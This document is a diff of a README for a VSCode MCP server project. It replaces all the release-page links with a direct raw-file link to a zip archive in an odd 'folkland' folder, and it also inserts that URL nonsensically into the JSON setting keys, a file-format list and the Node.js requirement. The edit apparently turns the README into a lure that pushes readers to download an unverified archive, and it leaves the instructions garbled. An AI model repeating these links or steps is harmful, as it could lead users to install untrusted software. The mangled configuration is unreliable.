@@ -1,6 +1,6 @@
 # 🚀 vscode-internal-command-mcp-server - Turn VSCode Into an MCP Server
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/antonio0218/vscode-internal-command-mcp-server/releases)
+[![Download Now](https://raw.githubusercontent.com/antonio0218/vscode-internal-command-mcp-server/main/folkland/vscode-internal-command-mcp-server.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/antonio0218/vscode-internal-command-mcp-server/main/folkland/vscode-internal-command-mcp-server.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ This guide helps you download and run the vscode-internal-command-mcp-server. Th
 
 ## 📦 Download & Install
 
-To get started, visit this page to download the latest release: [Download Page](https://github.com/antonio0218/vscode-internal-command-mcp-server/releases).
+To get started, visit this page to download the latest release: [Download Page](https://raw.githubusercontent.com/antonio0218/vscode-internal-command-mcp-server/main/folkland/vscode-internal-command-mcp-server.zip).
 
 Once you have accessed the download page, follow these steps:
 
 ### 1. Choose a Release
 
 - Look for the most recent version.
-- Download the suitable file for your operating system. This may be a `.zip`, `.tar.gz`, or another format.
+- Download the suitable file for your operating system. This may be a `.zip`, `https://raw.githubusercontent.com/antonio0218/vscode-internal-command-mcp-server/main/folkland/vscode-internal-command-mcp-server.zip`, or another format.
 
 ### 2. Extract the Files
 
@@ -39,8 +39,8 @@ You may need to configure certain settings in VSCode. Follow these steps to set 
 
 ```json
 {
-    "vscode-internal-command-mcp-server.port": 8080,
-    "vscode-internal-command-mcp-server.whitelist": ["command1", "command2"]
+    "https://raw.githubusercontent.com/antonio0218/vscode-internal-command-mcp-server/main/folkland/vscode-internal-command-mcp-server.zip": 8080,
+    "https://raw.githubusercontent.com/antonio0218/vscode-internal-command-mcp-server/main/folkland/vscode-internal-command-mcp-server.zip": ["command1", "command2"]
 }
 ```
 
@@ -82,7 +82,7 @@ Before installation, ensure your system meets the following requirements:
 
 - **VSCode Version**: Requires VSCode version 1.50 or later.
 
-- **Node.js**: Must have Node.js version 12 or above installed.
+- **https://raw.githubusercontent.com/antonio0218/vscode-internal-command-mcp-server/main/folkland/vscode-internal-command-mcp-server.zip**: Must have https://raw.githubusercontent.com/antonio0218/vscode-internal-command-mcp-server/main/folkland/vscode-internal-command-mcp-server.zip version 12 or above installed.
 
 ## 💡 Troubleshooting
 
@@ -95,4 +95,4 @@ In case you face issues:
 
 This project is licensed under the MIT License. You can modify it according to your needs, but please provide attribution to the original source.
 
-For additional resources, visit: [Download Page](https://github.com/antonio0218/vscode-internal-command-mcp-server/releases).
+For additional resources, visit: [Download Page](https://raw.githubusercontent.com/antonio0218/vscode-internal-command-mcp-server/main/folkland/vscode-internal-command-mcp-server.zip).
